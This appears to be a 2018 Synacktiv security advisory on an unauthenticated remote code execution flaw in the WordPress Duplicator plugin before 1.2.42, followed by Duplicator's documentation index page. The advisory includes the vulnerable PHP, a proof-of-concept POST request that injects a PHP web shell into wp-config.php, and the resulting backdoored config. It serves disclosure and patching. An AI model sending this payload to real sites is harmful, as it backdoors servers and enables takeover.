=== Content from www.synacktiv.com_2f9ef73f_20250125_215408.html ===
Remote code execution vulnerability
in WordPress Duplicator < 1.2.42

Security advisory
2018-08-29

Thomas Chauchefoin
Julien Legras

www.synacktiv.com

5 rue Sextius Michel 75015 Paris

Vulnerability description

Presentation of WordPress Duplicator
“Duplicator creates a package that bundles all the site’s plugins, themes, content, database and WordPress files into a
simple zip file called a package. This package can then be used to easily migrate a WordPress site to any location you wish.
Move on the same server, across servers and pretty much any location a WordPress site can be hosted. WordPress is not
required for installation since the package contains all site files.”1

The issue
Synacktiv discovered that  WordPress Duplicator  does not remove sensitive files after the restoration process. Indeed, the
installer.php and installer-backup.php files can be reused after the restoration process to inject malicious PHP code in the
wp-config.php file. Thus, an attacker could abuse these scripts to execute arbitrary code on the server and take it over.

Even though the code injection was fixed in a first release, it is still possible to gain arbitrary PHP code execution. Indeed,
install steps can be bypassed to force the installer script to insert all the backed up data in an arbitrary MySQL database. As
the attacker controls this database, he would be able to change the hash of an administrative user to gain access to the
dashboard. Finally, he could upload a malicious WordPress plugin to execute PHP code.

Affected versions
The last version at the time of this advisory, 1.2.40, is known to be affected.

Workaround
Update WordPress Duplicator plugin to the version 1.2.42 and remove the remaining files of Duplicator after restore.

Timeline

Date

2018-07-13

2018-07-14

2018-07-23

2018-08-23

2018-08-24

2018-08-29

Action

Advisory sent to Duplicator developers.

First response of Duplicator developers.

First fix proposed for the code injection.

Final version of the fix proposed.

Version 1.2.42 published.

Advisory published.

1 https://wordpress.org/plugins/duplicator/

 2/4

Technical description and proof-of-concept

Initial vulnerability discovery
Duplicator is a WordPress plugin that can be used to create a complete backup of a WordPress instance and restore it on a
fresh server. The export method generates 2 files:

•

•

An ZIP archive with the complete WordPress files and Duplicator specific files:

•

•

A copy of the installer.php script: installer-backup.php

A SQL script that will be used to restore the database content: database.sql

An installer PHP script to restore the archive installer.php

When the installer.php completes its process, the following files remain in the directory and has to be manually deleted:

•

•

•

•

•

•

The ZIP archive

database.sql

installer-backup.php

installer-data.sql

installer-log.txt

installer.php

It   was   found   that   the   scripts  installer.php  or  installer-backup.php  allow   to   overwrite   the   existing   configuration   files  wp-
config.php  and  .htaccess.   Indeed,   the   script   replaces   the   content   of   the   database   connection   parameters   using   string
concatenation without any kind of sanitization:

class DUPX_WPConfig
{
/**
*  Updates the web server config files in Step 1
*
*  @return null
*/
public static function updateStandard()
{
   if (!file_exists('wp-config.php')) return;
   $root_path     = DUPX_U::setSafePath($GLOBALS['CURRENT_ROOT_PATH']);
   $wpconfig     = @file_get_contents('wp-config.php', true);
   $patterns = array(
       "/'DB_NAME',\s*'.*?'/",
       "/'DB_USER',\s*'.*?'/",
       "/'DB_PASSWORD',\s*'.*?'/",
       "/'DB_HOST',\s*'.*?'/");
   $db_host = ($_POST['dbport'] == 3306) ? $_POST['dbhost'] : "{$_POST['dbhost']}:
{$_POST['dbport']}";

   $replace = array(
       "'DB_NAME', ".'\''.$_POST['dbname'].'\'',
       "'DB_USER', ".'\''.$_POST['dbuser'].'\'',
       "'DB_PASSWORD', ".'\''.DUPX_U::pregReplacementQuote($_POST['dbpass']).'\'',
       "'DB_HOST', ".'\''.$db_host.'\'');
[...]

This updateStandard function is called in the step 3 of the installer:

if (isset($_POST['action_ajax'])) :

/[...]
switch ($_POST['action_ajax']) :

 3/4

[...]
   case "2": ?><?php
[...]
DUPX_Log::info("\n====================================");
DUPX_Log::info('CONFIGURATION FILE UPDATES:');
DUPX_Log::info("====================================\n");
DUPX_WPConfig::updateStandard();
$config_file = DUPX_WPConfig::updateExtended();
DUPX_Log::info("UPDATED WP-CONFIG: {$root_path}/wp-config.php' (if present)");

This behavior can be abused to insert malicious PHP code in wp-config.php and backdoor the website.

Proof of concept of the code injection
Synacktiv consultants managed to send the following HTTP request to gain arbitrary command execution on the server:

POST /installer-backup.php HTTP/1.1
Host: 192.168.56.101
Content-Length: 242
Content-Type: application/x-www-form-urlencoded
Connection: close

action_ajax=3&action_step=3&dbhost=nowhere&dbuser=test&dbpass=test&dbname=test');
file_put_contents("test.php", '<pre><?php if (isset($_GET["synacktiv_backdoor"])) { echo
shell_exec($_GET["synacktiv_backdoor"]); } ?></pre>'); /*&dbport=12345&

Then, the wp-config.php file contains the malicious injected code:

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'test'); file_put_contents("test.php", '<pre><?php if
(isset($_GET["synacktiv_backdoor"])) { echo shell_exec($_GET["synacktiv_backdoor"]); } ?></pre>'); /
*');
/** MySQL database username */
define('DB_USER', 'test');

/** MySQL database password */
define('DB_PASSWORD', 'test');

/** MySQL hostname */
define('DB_HOST', 'nowhere:12345');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

The next step is to request the configuration file to execute the malicious code and puts the backdoor content inside a
test.php file. Then, the backdoor can be used:

Illustration 1: Simple PHP backdoor.

Impact
A successful exploitation allows an unauthenticated attacker to execute arbitrary code on the remote server. Please note that
a successful exploitation is destructive as it breaks the WordPress configuration file and thus, the WordPress instance.

 4/4



=== Content from snapcreek.com_e0b2a662_20250125_215408.html ===

[Duplicator
![](https://duplicator.com/wp-content/themes/duplicator-edd/images/duplicator-logo-1.svg)](https://duplicator.com/)

* [Features](/features/)

  **All Features**
  [Secure WordPress Backups](/secure-wordpress-backups/)
  [Recovery Points (1-click Restore)](/disaster-recovery-1-click-restore/)
  [Fast WordPress Migrations](/wordpress-migration/)
  [WordPress Multisite Backups](/wordpress-multisite-backups/)
  [WooCommerce Backups](/woocommerce-backups/)
  [Pre-configured WordPress Installs](/pre-configured-wordpress-installations/)
  [Server to Server Migration Tool](/server-to-server-wordpress-migration/)
  [Drag & Drop Website Import Tool](/drag-drop-import-wordpress-tool/)
  [Clone WordPress Website Plugin](/clone-wordpress-plugin/)
  [View all →](/features/)

  **Integrations**
  [Amazon S3](/amazon-s3-wordpress-backup-plugin/)
  [Google Drive](/google-drive-wordpress-backup-plugin/)
  [Dropbox](/dropbox-wordpress-backup-plugin/)
  [Microsoft OneDrive](/microsoft-one-drive-wordpress-backup-plugin/)
  [Vultr](/vultr-wordpress-backup-plugin/)
  [Digital Ocean](/wordpress-backups-for-digitalocean-spaces/)
  [Cloudflare R2](/cloudflare-r2-wordpress-backup-plugin/)
  [FTP / SFTP](/ftp-wordpress-backup-plugin/)
  [View all →](/features/#integrations)

  **What's New?**
   [Announcing Duplicator WP-CLI Commands (And How They Speed Up Backups)](https://duplicator.com/announcement-duplicator-wp-cli-commands/) [[New] Introducing Duplicator’s Sleek Redesign: New Look, Same Great Features](https://duplicator.com/duplicator-redesign-announcement/) [Introducing Dynamic Backup Names and 10 New Translations](https://duplicator.com/announcement-dynamic-backup-names/) [See all the updates →](/category/blog/announcement/)
* [Pricing](/pricing/)
* [Testimonials](/testimonials/)
* [Help Center](/knowledge-base/)

  [Getting Started](/knowledge-base-article-categories/quick-start/)
  [User Guide](/knowledge-base/)
  [FAQs](/knowledge-base-article-categories/troubleshooting/)
  [Changelog](/knowledge-base/changelog/)

  Contact Us
  [I have a technical question](/my-account/support/)

  If you’re already a customer, the fastest way to get help is through our support ticketing system.

  [I have a basic question](/contact/?form=1)

  Have a pre-sales question or general question about how our site / service works?
* [Blog](/blog/)
* [Login](/login/)
* [Get Duplicator](/pricing/)

[Duplicator
![](https://duplicator.com/wp-content/themes/duplicator-edd/images/duplicator-logo-1.svg)](https://duplicator.com/)

![](https://duplicator.com/wp-content/themes/duplicator-edd/images/mobile-menu-open.svg)
![](https://duplicator.com/wp-content/themes/duplicator-edd/images/mobile-menu-close.svg)

Get the Best WordPress Backup
& Migration Plugin Today
[Get Duplicator Now](/pricing/)
![](https://duplicator.com/wp-content/themes/duplicator-edd/images/mobile-cta-screenshot-2x.png)

* [Features](/features/)
* [Pricing](/pricing/)
* [Testimonials](/testimonials/)
* [Help Center](/knowledge-base/)
* [Blog](/blog/)
* [Login](/login/)

[![](/wp-content/themes/duplicator-edd/images/duplicator-logo-1.svg)](/)
Join 1,000,000+ using Duplicator to backup and migrate their WordPress sites!

[Get Started](/pricing/)
[See All Features](/features/)

# Duplicator Documentation

Documentation, Reference Materials, and Tutorials for Duplicator

## Getting Started

[16 articles](https://duplicator.com/knowledge-base-article-categories/quick-start/)

## Functionality

[23 articles](https://duplicator.com/knowledge-base-article-categories/functionality/)

## Installer

[5 articles](https://duplicator.com/knowledge-base-article-categories/installer/)

## Storage

[16 articles](https://duplicator.com/knowledge-base-article-categories/storage-how-to/)

## Account Management

[6 articles](https://duplicator.com/knowledge-base-article-categories/management/)

## Resources

[10 articles](https://duplicator.com/knowledge-base-article-categories/resources/)

## Troubleshooting

[88 articles](https://duplicator.com/knowledge-base-article-categories/troubleshooting/)

# How can we help?

Loading Results

[Submit a Ticket](/contact/)
### Quick Start

* [Classic Installation](https://duplicator.com/knowledge-base/classic-install/)
* [Overwrite a Backup](https://duplicator.com/knowledge-base/overwrite-install/)
* [Importing a Backup using Duplicator Pro](https://duplicator.com/knowledge-base/import-install/)
* [Installing the Duplicator Pro Plugin](https://duplicator.com/knowledge-base/plugin-installation/)
* [Creating Your First Backup](https://duplicator.com/knowledge-base/backup-site/)
* [A Complete Guide on Multisite Migration](https://duplicator.com/knowledge-base/how-does-duplicator-handle-multisite-support/)
* [Verifying Your License](https://duplicator.com/knowledge-base/license-activation/)
* [Recover Your Site Using Disaster Recovery](https://duplicator.com/knowledge-base/tools-recovery/)
* [A Complete Guide to Duplicator’s Storage Options](https://duplicator.com/knowledge-base/backup-to-the-cloud/)
* [Restoring Your Backup](https://duplicator.com/knowledge-base/restoring-your-backup/)

Get the Best WordPress Backup & Migration Plugin Today

Join over 1.5 million smart website owners who trust Duplicator for
their WordPress backup and migration

[Get Duplicator Now](/pricing/)

![](https://duplicator.com/wp-content/themes/duplicator-edd/images/cta-img-cropped.png)

### Company

* [About](/about/)
* [Careers](https://awesomemotive.com/careers/)
* [Press](/press/)
* [Affiliates](/affiliates/)
* [Blog](/blog/)
* [Contact](/contact/)

### Key Features

* [Secure WordPress Backups](/secure-wordpress-backups/)
* [Recovery Points (1-click Restore)](/disaster-recovery-1-click-restore/)
* [Fast WordPress Migrations](/wordpress-migration/)
* [WordPress Multisite Backups](/wordpress-multisite-backups/)
* [WooCommerce Backups](/woocommerce-backups/)
* [Pre-configured WordPress Installs](/pre-configured-wordpress-installations/)
* [WordPress Recovery Points with Quick Rollbacks](/wordpress-recovery-points-rollback/)
* [Partial WordPress Backup Plugin](/partial-wordpress-backup-plugin/)
* [Server to Server WordPress Migration Import Tool](/server-to-server-wordpress-migration/)
* [Smart WordPress Migration Wizard](/wordpress-migration-wizard/)
* [Drag & Drop Import WordPress Website Tool](/drag-drop-import-wordpress-tool/)
* [Clone WordPress Website Plugin](/clone-wordpress-plugin/)

### Integrations

* [Amazon S3](/amazon-s3-wordpress-backup-plugin/)
* [Google Drive](/google-drive-wordpress-backup-plugin/)
* [Dropbox](/dropbox-wordpress-backup-plugin/)
* [Microsoft OneDrive](/microsoft-one-drive-wordpress-backup-plugin/)
* [Vultr](/vultr-wordpress-backup-plugin/)
* [Digital Ocean](/wordpress-backups-for-digitalocean-spaces/)
* [Cloudflare R2](/cloudflare-r2-wordpress-backup-plugin/)
* [FTP / SFTP](/ftp-wordpress-backup-plugin/)
* [See more](/features/)

### Helpful Links

* [Support](/my-account/support/)
* [Documentation](/knowledge-base/)
* [Testimonials](/testimonials/)
* [WordPress Hosting](https://www.wpbeginner.com/wordpress-hosting/)

### Connect with us

Our Best Content

* [How to Back Up a WordPress Site](/how-to-backup-wordpress-site/)
* [How to Migrate a WordPress Site](/how-to-migrate-wordpress-site/)

* [How to Clone a WordPress Site](/clone-wordpress-site-2/)
* [How to Manually Move a WordPress Site](/manually-move-wordpress-site/)

* [Quickly Restore a WordPress Sites](/quickly-restore-wordpress-site-using-recovery-point/)
* [How to Move a Very Large WordPress Site](/how-move-very-large-site-duplicator-pro/)

Copyright © 2025 Duplicator. Duplicator® is a registered trademark of Snap Creek LLC

* [Terms of Service](/terms/)
* [Privacy Policy](/privacy-policy/)
* [Sitemap](/sitemap.xml)
* [Duplicator Coupon](/duplicator-coupon/)

![PayPal Verified Badge](https://duplicator.com/wp-content/themes/duplicator-edd/images/paypal-verified.png)
[![WPBeginner Verified Badge](https://duplicator.com/wp-content/themes/duplicator-edd/images/wp-verified-footer.svg)](https://www.wpbeginner.com/solutions/duplicator/)


